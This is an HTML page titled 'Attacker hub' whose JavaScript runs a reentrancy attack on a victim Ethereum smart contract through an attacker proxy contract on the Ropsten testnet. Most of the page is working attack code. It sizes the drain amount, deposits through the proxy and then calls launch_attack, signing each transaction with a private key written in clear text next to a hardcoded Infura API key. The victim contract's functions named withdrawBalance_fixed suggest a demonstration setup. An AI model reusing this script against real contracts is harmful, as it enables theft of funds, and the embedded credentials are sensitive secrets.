<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>Attacker hub</title>
    <script type="text/javascript" src="lib/ethereumjs-tx-1.3.3.min.js"></script>
    <script>
    var account = "0x375ec30b5db55c2e2696a72e2380d034db5a26bb";
    //Private key in clear text: Don't try this at home :)
    var privateKey = "35c003e2b992b8b57f1979d44efe7159fca4ba6555cd4943633be709a4ae0f2d";

    var debug;
    var attackerAddress;
    var amountAttack;
    var victimContractAddress = "0xD108C9a51B31b8Dc3cA42a4F8f51021821F01781";
    var victimContractAbi = '[{"constant":false,"inputs":[],"name":"withdrawBalance_fixed","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"withdrawBalance","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"addToBalance","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"withdrawBalance_fixed_2","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"u","type":"address"}],"name":"getBalance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"anonymous":false,"inputs":[{"indexed":false,"name":"info","type":"string"}],"name":"debug","type":"event"}]';
    var VictimContract;
    var victimContractInstance;

    var ProxyContractAddress = "0x80E563dDb7669b1B60278C396f502F0F2458C70D";
    var ProxyContractAbi = '[{"constant":true,"inputs":[],"name":"vulnerable_contract","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"launch_attack","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"attackModeIsOn","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"get_money","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_vulnerable_contract","type":"address"}],"name":"deposit","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"},{"anonymous":false,"inputs":[{"indexed":false,"name":"info","type":"string"}],"name":"debug","type":"event"}]';
    var ProxyContract;
    var ProxyContractInstance;

    if (checkAttackCondition()) {
        victimContract = web3.eth.contract(JSON.parse(victimContractAbi));
        victimContractInstance = victimContract.at(victimContractAddress);

        ProxyContract = web3.eth.contract(JSON.parse(ProxyContractAbi));
        ProxyContractInstance = ProxyContract.at(ProxyContractAddress);
    }

    window.addEventListener('load', function() {

        // Checking if Web3 has been injected by the browser (Mist/MetaMask)
        if (typeof web3 !== 'undefined') {

            // Use the browser's ethereum provider
            var provider = web3.currentProvider

        } else {
            console.log('No web3? You should consider trying MetaMask!')
        }

    })
    
    //Get the events from the victim contract and log them
    var debugVict = victimContractInstance.debug();
    debugVict.watch(function(error, result) {
        if (!error) {
            console.log(result.args.info);
        } else {

            console.log(error);
        }
    });

    //Get the events from the ProxyContract contract and log them
    ProxyContract = web3.eth.contract(JSON.parse(ProxyContractAbi));
    ProxyContractInstance = ProxyContract.at(ProxyContractAddress);
    var debugProx = ProxyContractInstance.debug();
    debugProx.watch(function(error, result) {
        if (!error) {
            console.log(result.args.info);
        } else {

            console.log(error);
        }
    });

    //check the victim and attacker contract parameter
    function checkAttackCondition() {
        var ret = true;
        if (!web3.isAddress(victimContractAddress)) {
            console.log("victim address is missing (use setVictimAddress())");
            ret = false;
        }
        if (!web3.isAddress(ProxyContractAddress)) {
            console.log("Proxy Contract Address address is missing (use setProxyContract())");
            ret = false;
        }
        if (victimContractAbi == "") {
            console.log("victim abi is missing (use setvictimContractAbi())");
            ret = false;
        }
        if (ProxyContractAbi == "") {
            console.log("Proxy Contract Address ABI is missing (use setProxyContractAbi())");
            ret = false;
        }

        return ret;
    }

    //The whole attack will fail if the smart contract contain less than twice as the attacker's contract balance.
    //This function will determine the maximum amount of the attacker's transaction 
    function step0() {
        var attackerBalance;
        var contractBalance;

        // amountAttack = web3.toWei(amountAttack, 'ether');
        victimContractInstance.getBalance(ProxyContractAddress, function(error, result) {
            attackerBalance = result.toNumber();
            web3.eth.getBalance(victimContractAddress, function(error, result) {
                contractBalance = result.toNumber();
                amountAttack = Math.floor(((contractBalance) / 2));
                console.log("Balance contract:" + contractBalance + ", Attacker balance:" + attackerBalance + ", Amount attack" + amountAttack);
                if (contractBalance >= amountAttack * 2) {
                    console.log("The amount of the attacker's transaction should be " + web3.fromWei(amountAttack, 'ether'));

                } else {
                    console.log("Something is bugged here...");
                }
            });
        });



    }

    function step1(amountEth) {
        ///
        if (!isNaN(amountEth)) {

            var web3 = new Web3(new Web3.providers.HttpProvider("https://ropsten.infura.io/i3RVw2qkKtl0fLuVGPgV"));
            /////deposit
            web3.eth.getTransactionCount(account, function(err, nonce) {
                var data = web3.eth.contract(JSON.parse(ProxyContractAbi)).at(ProxyContractAddress).deposit.getData(victimContractAddress);

                var tx = new ethereumjs.Tx({
                    nonce: nonce,
                    gasPrice: web3.toHex(web3.toWei('4000', 'gwei')),
                    gasLimit: 100000,
                    to: ProxyContractAddress,
                    value: web3.toHex(web3.toWei(amountEth, 'ether')),
                    data: data,
                });
                tx.sign(ethereumjs.Buffer.Buffer.from(privateKey, 'hex'));

                var raw = '0x' + tx.serialize().toString('hex');
                // console.log(raw);
                web3.eth.sendRawTransaction(raw, function(err, transactionHash) {
                    console.log(err);
                    console.log("https://ropsten.etherscan.io/tx/" + transactionHash);

                });
            });
        } else {
            console.log("Missing the amount of the transaction");
        }
    }

    function step2() {
        ///////////Withdraw////////////:
        web3.eth.getTransactionCount(account, function(err, nonce) {
            var data = web3.eth.contract(JSON.parse(ProxyContractAbi)).at(ProxyContractAddress).launch_attack.getData();

            var tx = new ethereumjs.Tx({
                nonce: nonce,
                gasPrice: web3.toHex(web3.toWei('4000', 'gwei')),
                gasLimit: 100000,
                to: ProxyContractAddress,
                value: 0,
                data: data,
            });
            tx.sign(ethereumjs.Buffer.Buffer.from(privateKey, 'hex'));

            var raw = '0x' + tx.serialize().toString('hex');
            // console.log(raw);
            web3.eth.sendRawTransaction(raw, function(err, transactionHash) {
                console.log(err);
                console.log("https://ropsten.etherscan.io/tx/" + transactionHash);
            });
        });
        ///////////////Withdraw////////////////
    }



    //This function is used to credit the balance of the victim's contract
    function deposit() {
        victimContractInstance.addToBalance({
            //gas: 1000000,
            value: web3.toWei(1, 'ether')
        }, function(error, result) {
            if (!error) {
                console.log(result);
                console.log("Success")
                web3.eth.getAccounts((err, res) => {
                    victimContractInstance.getBalance(res[0], function(error, result) { console.log(result.toNumber()) });
                });

            } else {
                console.error(error);
            }
        });

    }

    </script>
    <style type="text/css">
      body {
              margin:0;
              padding:0;
              background: url("gameover.png") no-repeat top fixed; 
              -webkit-background-size: cover; /* pour anciens Chrome et Safari */
              background-size: 100%; /* version standardis√©e */
              background-color: black;
          }

    </style>
</head>

<body >
</body>

</html>